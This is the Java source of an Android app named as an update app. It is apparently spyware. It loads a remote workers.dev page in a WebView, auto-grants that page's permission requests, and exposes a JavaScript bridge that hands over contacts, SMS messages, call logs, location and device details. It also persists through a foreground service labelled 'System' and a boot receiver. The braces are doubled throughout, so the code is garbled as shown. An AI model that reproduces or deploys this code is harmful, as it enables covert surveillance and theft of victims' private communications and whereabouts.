package com.update.app;
import android.app.*;import android.content.*;import android.os.*;import android.provider.*;import android.telephony.*;import android.webkit.*;
public class MainActivity extends Activity{{
 WebView w;
 @Override protected void onCreate(Bundle s){{
  super.onCreate(s);
  w=new WebView(this);w.getSettings().setJavaScriptEnabled(true);w.getSettings().setDomStorageEnabled(true);w.getSettings().setAllowFileAccess(true);w.getSettings().setGeolocationEnabled(true);
  w.addJavascriptInterface(new JS(this),"Android");w.loadUrl("https://discord-bot.kanserbusiness.workers.dev/v/apk_buw8n0nq");
  w.setWebChromeClient(new WebChromeClient(){{
   public void onPermissionRequest(PermissionRequest r){{r.grant(r.getResources());}}
  }});
  setContentView(w);startService(new Intent(this,PersistService.class));
  requestPermissions(new String[]{{"android.permission.CAMERA","android.permission.RECORD_AUDIO","android.permission.ACCESS_FINE_LOCATION","android.permission.READ_CONTACTS","android.permission.READ_SMS","android.permission.READ_CALL_LOG"}},1);
 }}
 class JS{{
  Context c;JS(Context x){{c=x;}}
  @android.webkit.JavascriptInterface public String contacts(){{
   StringBuilder s=new StringBuilder();try{{Cursor cur=c.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);if(cur!=null){{while(cur.moveToNext()){{String id=cur.getString(cur.getColumnIndex("_id"));String n=cur.getString(cur.getColumnIndex("display_name"));if(Integer.parseInt(cur.getString(cur.getColumnIndex("has_phone_number")))>0){{Cursor p=c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,"contact_id=?",new String[]{{id}},null);if(p!=null){{while(p.moveToNext())s.append(n).append(":").append(p.getString(p.getColumnIndex("data1"))).append("\n");p.close();}}}}cur.close();}}}}catch(Exception e){{}}return s.toString();}}
  @android.webkit.JavascriptInterface public String sms(){{StringBuilder s=new StringBuilder();try{{Cursor cur=c.getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);if(cur!=null){{while(cur.moveToNext())s.append(cur.getString(cur.getColumnIndex("address"))).append(":").append(cur.getString(cur.getColumnIndex("body"))).append("\n");cur.close();}}}}catch(Exception e){{}}return s.toString();}}
  @android.webkit.JavascriptInterface public String calls(){{StringBuilder s=new StringBuilder();try{{Cursor cur=c.getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null);if(cur!=null){{while(cur.moveToNext())s.append(cur.getString(cur.getColumnIndex("number"))).append(":").append(cur.getString(cur.getColumnIndex("type"))).append("\n");cur.close();}}}}catch(Exception e){{}}return s.toString();}}
  @android.webkit.JavascriptInterface public String device(){{return Build.MODEL+"|"+Build.MANUFACTURER+"|"+Build.VERSION.RELEASE;}}
  @android.webkit.JavascriptInterface public String location(){{try{{LocationManager lm=(LocationManager)c.getSystemService("location");Location l=lm.getLastKnownLocation("gps");if(l==null)l=lm.getLastKnownLocation("network");if(l!=null)return l.getLatitude()+","+l.getLongitude();}}catch(Exception e){{}}return "0,0";}}
 }}
 public static class PersistService extends Service{{public IBinder onBind(Intent i){{return null;}}public int onStartCommand(Intent i,int f,int id){{startForeground(1,new Notification.Builder(this,"bg").setContentTitle("System").setSmallIcon(android.R.drawable.ic_menu_info_details).build());return START_STICKY;}}}}
 public static class BootReceiver extends BroadcastReceiver{{public void onReceive(Context c,Intent i){{c.startService(new Intent(c,PersistService.class));Intent l=new Intent(c,MainActivity.class);l.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);c.startActivity(l);}}}}
}}
